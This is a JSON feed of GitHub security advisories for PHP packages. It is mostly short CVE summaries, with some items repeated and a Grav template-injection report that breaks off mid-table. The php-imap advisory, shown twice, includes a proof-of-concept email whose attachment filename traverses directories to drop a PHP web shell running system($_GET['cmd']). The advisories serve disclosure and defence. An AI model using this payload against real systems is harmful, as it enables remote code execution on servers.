{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).\nIn this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).\nEven if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.\nThere is also no restriction about the file extension (e.g. \".php\") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.\nThe attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...\nThe official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href=\"https://www.php-imap.com/api/attachment\">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>\n</ol>\n<pre><code>Return-Path: &lt;attacker@example.com&gt;\nDate: Fri, 17 Aug 2018 14:36:24 +0000\nFrom: Attacker &lt;attacker@example.com&gt;\nTo: Victim &lt;victim@example.com&gt;\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\"\n\nMail with malicious attachment\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\nContent-Type: application/octet-stream; name=shell.php\nContent-Transfer-Encoding: 8bit\nContent-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php\n\n&lt;?php\n// RCE\nsystem($_GET['cmd'] ?? '#');\n?&gt;\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--\n\n</code></pre>\n<ol start=\"3\">\n<li>crawl email with malicious attachment</li>\n<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.\nEvery application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/pull/414\">https://github.com/Webklex/php-imap/pull/414</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/releases/tag/5.3.0\">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9",
            "title": "[webklex/laravel-imap] php-imap vulnerable to RCE through a directory traversal vulnerability",
            "date_modified": "2023-06-21T21:59:00.000Z",
            "date_published": "2023-06-21T21:58:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).\nIn this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).\nEven if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.\nThere is also no restriction about the file extension (e.g. \".php\") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.\nThe attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...\nThe official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href=\"https://www.php-imap.com/api/attachment\">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>\n</ol>\n<pre><code>Return-Path: &lt;attacker@example.com&gt;\nDate: Fri, 17 Aug 2018 14:36:24 +0000\nFrom: Attacker &lt;attacker@example.com&gt;\nTo: Victim &lt;victim@example.com&gt;\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\"\n\nMail with malicious attachment\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\nContent-Type: application/octet-stream; name=shell.php\nContent-Transfer-Encoding: 8bit\nContent-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php\n\n&lt;?php\n// RCE\nsystem($_GET['cmd'] ?? '#');\n?&gt;\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--\n\n</code></pre>\n<ol start=\"3\">\n<li>crawl email with malicious attachment</li>\n<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.\nEvery application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/pull/414\">https://github.com/Webklex/php-imap/pull/414</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/releases/tag/5.3.0\">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9",
            "title": "[webklex/php-imap] php-imap vulnerable to RCE through a directory traversal vulnerability",
            "date_modified": "2023-06-21T21:59:00.000Z",
            "date_published": "2023-06-21T21:58:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Request Forgery vulnerability in Gila GilaCMS v.1.11.4 allows a remote attacker to execute arbitrary code via the <code>cm/update_rows/user</code> parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-20726\">https://nvd.nist.gov/vuln/detail/CVE-2020-20726</a></li>\n<li><a href=\"https://github.com/GilaCMS/gila/issues/51\">https://github.com/GilaCMS/gila/issues/51</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4cw3-rhqx-vqwr\">https://github.com/advisories/GHSA-4cw3-rhqx-vqwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4cw3-rhqx-vqwr",
            "title": "[gilacms/gila] GilaCMS Cross Site Request Forgery vulnerability",
            "date_modified": "2023-06-21T18:36:55.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4cw3-rhqx-vqwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Craft CMS through 4.4.9 is vulnerable to HTML Injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-33495\">https://nvd.nist.gov/vuln/detail/CVE-2023-33495</a></li>\n<li><a href=\"https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212\">https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212</a></li>\n<li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection\">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m3v5-gjj9-rg24\">https://github.com/advisories/GHSA-m3v5-gjj9-rg24</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m3v5-gjj9-rg24",
            "title": "[craftcms/cms] Craft CMS vulnerable to HTML injection",
            "date_modified": "2023-06-21T18:36:29.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m3v5-gjj9-rg24"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[bigfork/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-wm5g-p99q-66g4. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>_joinPath in elFinderVolumeLocalFileSystem.class.php in elFinder before 2.1.62 allows path traversal in the PHP LocalVolumeDriver connector.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4\">https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35840\">https://nvd.nist.gov/vuln/detail/CVE-2023-35840</a></li>\n<li><a href=\"https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891\">https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3p2q-mh7q-9pxj\">https://github.com/advisories/GHSA-3p2q-mh7q-9pxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3p2q-mh7q-9pxj",
            "title": "[studio-42/elfinder] Duplicate Advisory: elFinder vulnerable to path traversal in LocalVolumeDriver connector",
            "date_modified": "2023-06-19T20:16:23.000Z",
            "date_published": "2023-06-19T03:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3p2q-mh7q-9pxj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ipandlanguageredirect extension before 5.1.2 for TYPO3 allows SQL Injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35782\">https://nvd.nist.gov/vuln/detail/CVE-2023-35782</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-005\">https://typo3.org/security/advisory/typo3-ext-sa-2023-005</a></li>\n<li><a href=\"https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42\">https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4xf2-7qfv-mgfx\">https://github.com/advisories/GHSA-4xf2-7qfv-mgfx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4xf2-7qfv-mgfx",
            "title": "[in2code/ipandlanguageredirect] ipandlanguageredirect extension vulnerable to SQL Injection",
            "date_modified": "2023-06-16T22:14:35.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4xf2-7qfv-mgfx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-16T22:10:51.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-16T22:10:51.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-16T22:10:51.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Hi,</p>\n<p>actually we have sent the bug report to <a href=\"mailto:security@getgrav.org\">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>\n<h1 id=\"grav-server-side-template-injection-ssti-via-twig-default-filters\">Grav Server-side Template Injection (SSTI) via Twig Default Filters</h1>\n<h2 id=\"summary\">Summary:</h2>\n<table>\n<thead>\n<tr>\n<th><strong>Product</strong></th>\n<th>Grav CMS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Vendor</strong></td>\n<td>Grav</td>\n</tr>\n<tr>\n<td><strong>Severity</strong></td>\n<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>\n</tr>\n<tr>\n<td><strong>Affected Versions</strong></td>\n<td>&lt;= <a href=\"https://github.com/getgrav/grav/tree/1.7.40\">v1.7.40</a> (Commit <a href=\"https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61\">685d762</a>) (Latest version as of writing)</td>\n</tr>\n<tr>\n<td><strong>Tested Versions</strong></td>\n<td>v1.7.40</td>\n</tr>\n<tr>\n<td><strong>Internal Identifier</strong></td>\n<td>STAR-2023-0008</td>\n</tr>\n<tr>\n<td><strong>CVE Identifier</strong></td>\n<td>TBD</td>\n</tr>\n<tr>\n<td><strong>CWE(s)</strong></td>\n<td>CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>\n</tr>\n</tbody></table>\n<h2 id=\"cvss31-scoring-system\">CVSS3.1 Scoring System:</h2>\n<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  